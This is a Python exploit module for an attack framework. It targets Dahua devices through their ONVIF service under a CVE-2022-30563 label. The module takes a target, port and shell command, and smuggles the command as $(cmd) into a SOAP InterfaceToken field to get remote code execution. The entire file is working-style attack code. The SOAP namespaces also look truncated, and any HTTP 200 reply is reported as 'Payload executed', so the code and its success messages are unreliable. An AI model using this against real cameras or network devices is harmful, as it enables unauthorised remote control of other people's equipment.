import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "dahua/cve_2022_30563_attack"
        self.description = "Exploit engine to deliver RCE payloads via compromised ONVIF layers on Dahua equipment."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"},
            "CMD": {"required": True, "value": "id"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        cmd = self.options["CMD"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/onvif/device_service"
        else:
            url = f"{target.rstrip('/')}/onvif/device_service"
            
        # Payload injectant la commande dans une variable réseau ONVIF traitée par l'OS
        payload = f"<s:Envelope xmlns:s='http://w3.org'><s:Body><SetNetworkInterfaces xmlns='http://onvif.org'><InterfaceToken>$({cmd})</InterfaceToken></SetNetworkInterfaces></s:Body></s:Envelope>"
        
        try:
            async with httpx.AsyncClient(timeout=8.0, verify=False) as client:
                print(f"\033[1;33m[*] Delivering Dahua Root RCE command via ONVIF vector: {cmd}\033[0m")
                response = await client.post(url, content=payload, headers={"Content-Type": "application/soap+xml"})
                if response.status_code == 200:
                    return {
                        "success": True,
                        "details": f"Payload executed. Framework triggered action successfully on Dahua target backend (Reflected response: {len(response.text)} bytes)."
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "The target subsystem refused data variable expansion."}
